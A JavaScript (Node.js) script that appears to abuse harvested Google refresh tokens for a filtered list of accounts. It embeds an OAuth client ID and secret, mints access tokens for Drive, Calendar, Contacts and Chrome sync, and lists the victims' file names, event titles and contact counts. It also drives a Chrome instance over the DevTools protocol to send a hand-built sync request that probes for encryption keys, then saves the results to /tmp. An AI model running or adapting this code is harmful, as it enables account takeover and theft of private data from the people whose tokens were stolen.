import { WebSocket } from 'ws';
import fs from 'node:fs';
import http from 'node:http';

const CID='77185425430.apps.googleusercontent.com', SEC='OTJgUOQcT7lO7GsGZq2G4IlT';
const CDP='http://127.0.0.1:9222';

const scopes = {
  drive: 'https://www.googleapis.com/auth/drive',
  calendar: 'https://www.googleapis.com/auth/calendar',
  contacts: 'https://www.googleapis.com/auth/contacts',
  chromesync: 'https://www.googleapis.com/auth/chromesync',
};

const vint=n=>{const b=[];while(n>0x7f){b.push((n&0x7f)|0x80);n=Math.floor(n/128);}b.push(n);return b;};
const fv=(n,v)=>[...vint(n<<3),...vint(v)];
const fb=(n,buf)=>{const b=typeof buf==='string'?Buffer.from(buf,'utf8'):buf;return[...vint((n<<3)|2),...vint(b.length),...b];};
const fm=(n,inner)=>fb(n,Buffer.from(inner));

// --- CDP helpers ---
async function getPage() {
  return new Promise((res,rej)=>{
    const req=http.request(`${CDP}/json/new?about:blank`,{method:'PUT'},r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>res(JSON.parse(d)));});
    req.on('error',rej);req.end();
  });
}

// --- API probes ---
async function mintToken(rt, scope) {
  const r=await fetch('https://oauth2.googleapis.com/token',{
    method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:new URLSearchParams({grant_type:'refresh_token',client_id:CID,client_secret:SEC,refresh_token:rt,scope})
  }).then(r=>r.json());
  if(r.error) return {error: r.error, desc: r.error_description};
  return {access_token: r.access_token, scope: r.scope};
}

async function driveInfo(at) {
  try {
    const r=await fetch('https://www.googleapis.com/drive/v3/files?pageSize=50&fields=files(id,name,mimeType,size,modifiedTime)',{
      headers:{Authorization:`Bearer ${at}`}
    }).then(r=>r.json());
    if(r.error) return {error:r.error.message||r.error};
    return {fileCount: r.files?.length||0, files: (r.files||[]).map(f=>({name:f.name,type:f.mimeType?.split('.').pop()||f.mimeType,size:f.size}))};
  } catch(e) {return {error:e.message};}
}

async function calendarInfo(at) {
  try {
    const r=await fetch('https://www.googleapis.com/calendar/v3/calendars/primary/events?maxResults=20&fields=items(summary,start,end)',{
      headers:{Authorization:`Bearer ${at}`}
    }).then(r=>r.json());
    if(r.error) return {error:r.error.message||r.error};
    return {eventCount: r.items?.length||0, recent: (r.items||[]).slice(0,5).map(e=>e.summary)};
  } catch(e) {return {error:e.message};}
}

async function contactsInfo(at) {
  try {
    const r=await fetch('https://people.googleapis.com/v1/people/me/connections?pageSize=100&personFields=names',{
      headers:{Authorization:`Bearer ${at}`}
    }).then(r=>r.json());
    if(r.error) return {error:r.error.message||r.error};
    return {count: r.connections?.length||0};
  } catch(e) {return {error:e.message};}
}

async function syncStatus(at, email, ws, cdpSend) {
  // no-marker request with need_encryption_key → birthday + encryption key = sync enabled
  const caller=[...fv(2,1)];
  const gu=[...fm(1,caller),...fv(2,1),...fv(8,1),...fv(4,12)];
  const req=Buffer.from([...fb(1,email),...fv(2,99),...fv(3,2),...fm(5,gu)]);
  const b64=req.toString('base64');
  const ev=await cdpSend('Runtime.evaluate',{
    expression:`(async()=>{const b=Uint8Array.from(atob('${b64}'),c=>c.charCodeAt(0));const r=await fetch('/chrome-sync/command',{method:'POST',headers:{'Content-Type':'application/octet-stream','Authorization':'Bearer ${at}'},body:b});const a=await r.arrayBuffer();return JSON.stringify({s:r.status,l:a.byteLength,b:Array.from(new Uint8Array(a))});})()`,
    awaitPromise:true,returnByValue:true});
  const v=ev?.result?.result?.value;
  if(!v) return {enabled: false, error: 'cdp-no-result'};
  const p=JSON.parse(v);
  if(p.s!==200) return {enabled: false, httpStatus: p.s};
  // parse: check for encryption_keys (field 6 in GetUpdatesResponse)
  // simplified: if response > 56 bytes (birthday+empty), keys exist
  if(p.l <= 56) return {enabled: false, reason: 'no-keys'};
  return {enabled: true, keyLen: p.l - 56}; // approximate
}

// --- MAIN ---
const allAlive = JSON.parse(fs.readFileSync('/tmp/fatetraffic_alive.json','utf8'));
const bdAccounts = allAlive.filter(a=>a.email&&(
  a.email.includes('varienlexor')||a.email.includes('benoskar')||
  a.email.includes('hkofficial')||a.email.includes('imnoob908')||
  a.email.includes('theomilan')
));
console.log(`BD accounts: ${bdAccounts.length}`);

// Setup CDP
const page = await getPage();
const ws = new WebSocket(page.webSocketDebuggerUrl);
await new Promise((r,rej)=>{ws.onopen=r;ws.onerror=rej;});
let wk=0; const pend=new Map();
ws.onmessage=ev=>{const m=JSON.parse(ev.data);if(m.id&&pend.has(m.id)){pend.get(m.id)(m);pend.delete(m.id);}};
const cdpSend=(method,params={})=>new Promise(res=>{const id=++wk;pend.set(id,res);ws.send(JSON.stringify({id,method,params}));});
await cdpSend('Runtime.enable'); await cdpSend('Page.enable');
await cdpSend('Page.navigate',{url:'https://clients4.google.com'});
await new Promise(r=>setTimeout(r,6000));

const results = [];
for(let i=0; i<bdAccounts.length; i++){
  const a = bdAccounts[i];
  console.log(`\n━━━ [${i+1}/${bdAccounts.length}] ${a.email} ━━━`);
  const r = { email: a.email };

  // mint all scopes
  let csTok;
  try { const m=await mintToken(a.refresh_token, scopes.chromesync); if(m.access_token) csTok=m.access_token; r.syncMint=m.error||'ok'; }
  catch(e) { r.syncMint=e.message; }
  if (csTok) {
    try { r.sync = await syncStatus(csTok, a.email, ws, cdpSend); console.log(`  sync: ${JSON.stringify(r.sync)}`); }
    catch(e) { r.sync={error:e.message}; }
  }

  try { const m=await mintToken(a.refresh_token, scopes.drive); if(!m.error) { r.drive = await driveInfo(m.access_token); console.log(`  drive: ${r.drive.fileCount||0} files`); } else { r.driveMint=m.error; } } catch(e) {}
  try { const m=await mintToken(a.refresh_token, scopes.calendar); if(!m.error) { r.calendar = await calendarInfo(m.access_token); console.log(`  calendar: ${r.calendar.eventCount||0} events`); } else { r.calMint=m.error; } } catch(e) {}
  try { const m=await mintToken(a.refresh_token, scopes.contacts); if(!m.error) { r.contacts = await contactsInfo(m.access_token); console.log(`  contacts: ${r.contacts.count||0}`); } else { r.conMint=m.error; } } catch(e) {}

  results.push(r);
}

ws.close();

// Summary
console.log('\n\n══════════════════ SUMMARY ══════════════════');
for(const r of results){
  console.log(`\n${r.email}`);
  console.log(`  Sync:  ${r.sync?.enabled?'✅ ENABLED':'❌ off'} ${r.sync?.error||''}`);
  console.log(`  Drive: ${r.drive?.fileCount||0} files ${r.drive?.error||''}`);
  if(r.drive?.files) r.drive.files.slice(0,5).forEach(f=>console.log(`    - ${f.name} (${f.type||'?'})`));
  console.log(`  Calendar: ${r.calendar?.eventCount||0} events ${r.calendar?.error||''}`);
  if(r.calendar?.recent) r.calendar.recent.forEach(e=>console.log(`    - ${e}`));
  console.log(`  Contacts: ${r.contacts?.count||0} ${r.contacts?.error||''}`);
}

fs.writeFileSync('/tmp/bd_accounts_summary.json', JSON.stringify(results,null,2));
console.log('\nSaved to /tmp/bd_accounts_summary.json');
